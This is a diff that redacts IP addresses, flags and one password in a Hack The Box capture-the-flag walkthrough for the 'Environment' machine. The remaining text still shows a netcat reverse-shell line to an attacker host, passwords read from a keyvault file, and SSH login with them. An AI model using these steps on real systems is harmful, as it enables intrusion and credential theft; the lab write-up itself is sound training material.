@@ -15,9 +15,9 @@ Author: [coopertim13](https://app.hackthebox.com/users/55851)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.9.78
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 23:14 EDT
-Nmap scan report for 10.129.9.78
+Nmap scan report for 10.129.xx.xx
 Host is up (0.34s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -36,7 +36,7 @@ Nmap done: 1 IP address (1 host up) scanned in 35.95 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.9.78     environment.htb
+10.129.xx.xx     environment.htb
 ```
 
 Let's check the web server.
@@ -206,23 +206,23 @@ Now we need to reverse shell for more information discovery.
 
 ```bash
 └─$ penelope -p 3333                                                                                       
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
-Use this `nc 10.10.16.36 3333` to get the reverse shell.
+Use this `nc 10.xx.xx.xx 3333` to get the reverse shell.
 
 > *Be sure to check if there is `nc` via `which nc` command.*
 
 ```bash
 └─$ penelope -p 3333     
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from environment~10.129.9.78-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from environment~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/environment~10.129.9.78-Linux-x86_64/2025_08_20-01_25_23-284.log 📜
+[+] Logging to /home/kali/.penelope/environment~10.129.xx.xx-Linux-x86_64/2025_08_20-01_25_23-284.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@environment:~/app/storage/app/public/files$
 ```
@@ -243,7 +243,7 @@ drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
 drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
 -rw-r--r-- 1 root hish   33 Aug 20 13:01 user.txt
 www-data@environment:/home/hish$ cat user.txt
-300f5c0f5b0488eea9f2c5029c674e9d
+300f5cxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Grab the `user.txt` flag.
@@ -339,16 +339,16 @@ drwx------  3 root     root     4096 Aug 20 13:00 systemd-private-06add1c7763d4c
 drwx------  2 root     root     4096 Aug 20 13:01 vmware-root_564-2965382482
 www-data@environment:/tmp$ cat keyvault.txt 
 PAYPAL.COM -> Ihaves0meMon$yhere123
-ENVIRONMENT.HTB -> marineSPm@ster!!
+ENVIRONMENT.HTB -> marineSPm@sterxx
 FACEBOOK.COM -> summerSunnyB3ACH!!
 ```
 
 Got another credentials that could probably for `hish` user. <br>
-&rarr; `marineSPm@ster!!`.
+&rarr; `marineSPm@sterxx`.
 
 ```bash
-└─$ ssh hish@10.129.9.78             
-hish@10.129.9.78's password: 
+└─$ ssh hish@10.129.xx.xx             
+hish@10.129.xx.xx's password: 
 hish@environment:~$ ls -la
 total 36
 drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
@@ -508,7 +508,7 @@ drwxr-xr-x  2 root root 4096 Apr 11 00:55 scripts
 -rw-r--r--  1 root root   66 Jan 12  2025 .selected_editor
 drwx------  2 root root 4096 Jan  6  2025 .ssh
 root@environment:~# cat root.txt
-f2dc782612101bdcf36c18e406d63d75
+f2dc78xxxxxxxxxxxxxxxxxx
 ```
 
 Pick the `root.txt` flag.
